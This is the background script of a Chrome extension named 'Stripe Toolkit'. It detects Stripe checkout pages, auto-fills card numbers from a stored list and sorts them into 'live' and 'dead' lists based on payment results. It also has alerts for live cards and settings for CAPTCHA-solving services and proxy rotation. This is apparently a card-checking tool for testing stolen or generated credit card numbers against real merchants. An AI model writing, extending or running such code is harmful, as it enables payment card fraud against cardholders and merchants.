let settings = {
    autoDetect: true,
    autoFill: false,
    autoSubmit: false,
    fillDelay: 500,
    captchaApiKey: '',
    captchaService: 'internal',
    proxyEnabled: false,
    proxyList: [],
    verbose: true,
    soundAlerts: false
};

chrome.runtime.onInstalled.addListener(() => {
    console.log('[BACKGROUND] Stripe Toolkit installed');
    
    chrome.storage.local.get(['settings', 'cards', 'liveCards', 'deadCards'], (data) => {
        if (data.settings) settings = { ...settings, ...data.settings };
    });
});

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    const tabId = sender.tab?.id;
    
    switch (message.type) {
        case 'checkoutDetected':
            handleCheckoutDetected(tabId, message);
            break;
            
        case 'cardResult':
            handleCardResult(tabId, message.result);
            break;
            
        case 'getSettings':
            sendResponse(settings);
            break;
            
        case 'settingsUpdated':
            settings = { ...settings, ...message.settings };
            break;
            
        case 'getCards':
            chrome.storage.local.get(['cards'], (data) => {
                sendResponse(data.cards || []);
            });
            return true;
            
        case 'saveCards':
            chrome.storage.local.set({ cards: message.cards });
            sendResponse({ success: true });
            break;
            
        case 'getLiveCards':
            chrome.storage.local.get(['liveCards'], (data) => {
                sendResponse(data.liveCards || []);
            });
            return true;
            
        case 'getDeadCards':
            chrome.storage.local.get(['deadCards'], (data) => {
                sendResponse(data.deadCards || []);
            });
            return true;
            
        default:
            console.log('[BACKGROUND] Unknown message:', message.type);
    }
    
    return true;
});

function handleCheckoutDetected(tabId, message) {
    console.log('[BACKGROUND] Checkout detected:', tabId, message.info?.url);
    
    chrome.action.setBadgeText({ text: 'ON', tabId: tabId });
    chrome.action.setBadgeBackgroundColor({ color: '#22c55e', tabId: tabId });
    
    if (settings.autoFill) {
        chrome.storage.local.get(['cards', 'currentCardIndex'], (data) => {
            const cards = data.cards || [];
            const index = data.currentCardIndex || 0;
            
            if (cards.length > 0 && cards[index]) {
                setTimeout(() => {
                    chrome.tabs.sendMessage(tabId, {
                        action: 'fillCard',
                        card: cards[index]
                    });
                }, settings.fillDelay);
            }
        });
    }
}

function handleCardResult(tabId, result) {
    console.log('[BACKGROUND] Card result:', result);
    
    chrome.storage.local.get(['cards', 'currentCardIndex', 'liveCards', 'deadCards'], (data) => {
        const cards = data.cards || [];
        const index = data.currentCardIndex || 0;
        let liveCards = data.liveCards || [];
        let deadCards = data.deadCards || [];
        
        if (cards[index]) {
            const card = cards[index];
            card.timestamp = Date.now();
            
            if (result.success || result.status === 'live') {
                card.status = 'live';
                liveCards.push({ ...card });
                
                chrome.action.setBadgeText({ text: 'LIVE', tabId: tabId });
                chrome.action.setBadgeBackgroundColor({ color: '#22c55e', tabId: tabId });
                
                if (settings.soundAlerts) {
                    chrome.tabs.sendMessage(tabId, { action: 'playSound', type: 'live' });
                }
                
                chrome.notifications.create({
                    type: 'basic',
                    iconUrl: 'icons/icon128.png',
                    title: 'LIVE CARD!',
                    message: `Card ending in ${card.number.slice(-4)} is LIVE!`
                });
            } else {
                card.status = 'dead';
                card.error = result.error || result.declineCode || 'Declined';
                deadCards.push({ ...card });
                
                chrome.action.setBadgeText({ text: 'DEAD', tabId: tabId });
                chrome.action.setBadgeBackgroundColor({ color: '#ef4444', tabId: tabId });
            }
            
            cards[index] = card;
            
            chrome.storage.local.set({
                cards: cards,
                liveCards: liveCards,
                deadCards: deadCards
            });
        }
    });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && settings.autoDetect) {
        const url = tab.url || '';
        if (url.includes('checkout.stripe.com') || 
            url.includes('stripe.com/pay') ||
            url.includes('/checkout')) {
            
            chrome.action.setBadgeText({ text: 'ON', tabId: tabId });
            chrome.action.setBadgeBackgroundColor({ color: '#22c55e', tabId: tabId });
        }
    }
});

chrome.tabs.onRemoved.addListener((tabId) => {
    console.log('[BACKGROUND] Tab closed:', tabId);
});

console.log('[BACKGROUND] Service worker started');
